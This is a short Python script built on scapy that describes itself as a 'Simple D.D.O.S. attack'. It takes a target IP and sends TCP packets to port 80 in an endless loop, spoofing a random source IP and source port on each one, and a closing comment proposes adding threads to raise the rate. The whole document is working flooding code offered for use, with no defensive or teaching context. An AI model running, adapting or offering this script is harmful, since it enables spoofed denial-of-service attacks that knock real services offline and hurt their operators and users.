#!/usr/bin/python3
from scapy.all import *
import argparse
from random import randint

parser = argparse.ArgumentParser(description="Simple D.D.O.S. attack")  #Distributed Denial Of Service
parser.add_argument("-t", "--target", dest="target", help="Target IP", required=True)
arguments = parser.parse_args()

def randomIP():
    part1 = str(randint(1,254))
    part2 = str(randint(1,254))
    part3 = str(randint(1,254))
    part4 = str(randint(1,254))
    dot = "."
    return(part1+dot+part2+dot+part3+dot+part4)

while True:
    IP1 = IP(src=randomIP(), dst=arguments.target)
    TCP1 = TCP(sport=randint(1, 65534), dport=80)
    package = IP1 / TCP1
    send(package, inter=0.001, verbose=False)   #inter: time interval to wait between two packages
    print("Ip: %s  -----------  Port: %i" %(IP1.src, TCP1.sport))

#TODO: optimize with threads
